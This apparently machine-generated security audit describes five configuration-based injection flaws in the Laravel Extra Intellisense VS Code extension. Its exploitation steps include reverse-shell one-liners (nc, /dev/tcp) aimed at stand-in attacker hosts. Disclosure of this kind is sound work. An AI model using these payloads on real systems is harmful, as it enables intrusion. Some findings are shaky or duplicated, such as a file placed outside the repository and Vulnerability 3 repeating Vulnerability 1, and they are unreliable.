# Security Vulnerabilities

## Vulnerability 1: Command Injection via `phpCommand` Configuration (Critical)
### Description
The `phpCommand` configuration template is directly interpolated into system command execution without sanitization. Attackers can inject arbitrary shell commands via this setting, leading to RCE.

### Step-by-Step Exploitation:
1. **Malicious Configuration Setup**
   The attacker adds the following to a malicious repository's `.vscode/settings.json`:
   ```json
   "LaravelExtraIntellisense.phpCommand": "php -r \"{code}\"; /bin/bash -c '/bin/nc -e /bin/sh 10.10.10.10 4444' &"
   ```
2. **Trigger Execution**
   The victim opens the repo. The extension executes the `phpCommand` during routine operations (e.g., model loading), triggering the reverse shell.

### Impact
Arbitrary system command execution with victim's privileges.

### Vulnerability Rank
Critical

### Current Implemented Mitigations
- None. The configuration is fully user-defined without validation.

### Missing Mitigations
- Sanitize `phpCommand` to prevent command injection via `{code}` placeholders.
- Enforce a white-listed command format.

---

## Vulnerability 2: PHP Code Execution via `modelsPaths` Configuration (High)
### Description
The `modelsPaths` config allows attackers to specify directories for scanning Eloquent models. By setting paths like `../..//`, attackers can include malicious PHP files placed in those directories, leading to code execution.

### Step-by-Step Exploitation:
1. **Malicious Repository Setup**
   The attacker creates a repo with:
   - `.vscode/settings.json`: `"LaravelExtraIntellisense.modelsPaths": ["../..//"]`
   - `../..//Exploit.php` containing PHP code like `system("bash -i > /dev/tcp/attacker_IP/PORT 2>&1"); die;`.
2. **Trigger Execution**
   The victim opens the repo, prompting the extension to scan the directories and execute the malicious `Exploit.php`.

### Impact
Arbitrary PHP code execution in the victim's environment.

### Vulnerability Rank
High

### Current Implemented Mitigations
- None. Paths are accepted without validation.

### Missing Mitigations
- Restrict paths to the project root.
- Sanitize input to block directory traversal.

---

## Vulnerability 3: Command Injection via `phpCommand` with Docker (High)
### Description
The `phpCommand` setting allows attackers to execute Docker commands alongside legitimate PHP execution. For example:
```json
"LaravelExtraIntellisense.phpCommand": "docker exec -it vulnerable_container php -r \"{code}\"; /bin/sh -i >& /dev/tcp/attacker_IP/PORT 2>&1 &"
```
This executes Docker commands to gain RCE in containers.

### Impact
RCE via malicious Docker operations.

### Vulnerability Rank
High

### Current Implemented Mitigations
- None.

### Missing Mitigations
- Sanitize `phpCommand` to block Docker command injection.

---

## Vulnerability 4: Code Injection via `customValidationRules` (High)
### Description
The `customValidationRules` config lets attackers inject malicious PHP code into validation rules. For example:
```json
"LaravelExtraIntellisense.customValidationRules": {
    "exploit": "system('bash -i > /dev/tcp/attacker_IP/PORT 2>&1'); die;"
}
```
The extension directly uses these rules in PHP contexts, executing the code.

### Impact
Arbitrary PHP code execution during validation operations.

### Vulnerability Rank
High

### Current Implemented Mitigations
- None.

### Missing Mitigations
- Sanitize `customValidationRules` to block code execution.

---

## Vulnerability 5: Arbitrary File Inclusion via `viewDirectorySeparator` (High)
### Description
The `viewDirectorySeparator` setting allows attackers to traverse directories (e.g., `../..//`). Combined with malicious `.blade.php` files in the repo, this lets attackers include PHP payload files.

### Step-by-Step Exploitation:
1. **Malicious Configuration Setup**
   The attacker sets `"LaravelExtraIntellisense.viewDirectorySeparator": "../..//"`.
2. **Exploit Trigger**
   The victim opens the repo, enabling the extension to include attacker-controlled files during view scanning.

### Impact
Arbitrary PHP code execution from included files.

### Vulnerability Rank
High

### Current Implemented Mitigations
- None.

### Missing Mitigations
- Restrict directory traversal in `viewDirectorySeparator`.
- Validate paths against the project root.

---

### Final List (Valid High/Critical Vulnerabilities)
1. **Vulnerability 1**: Critical command injection via `phpCommand`.
2. **Vulnerability 2**: High-severity code execution via `modelsPaths`.
3. **Vulnerability 3**: High-severity Docker command injection via `phpCommand`.
4. **Vulnerability 4**: High-severity validation rule code injection.
5. **Vulnerability 5**: High-severity file inclusion leading to code execution.

All vulnerabilities are valid, unmitigated, and meet the criteria (RCE/Command/Code Injection, rank ≥ High).
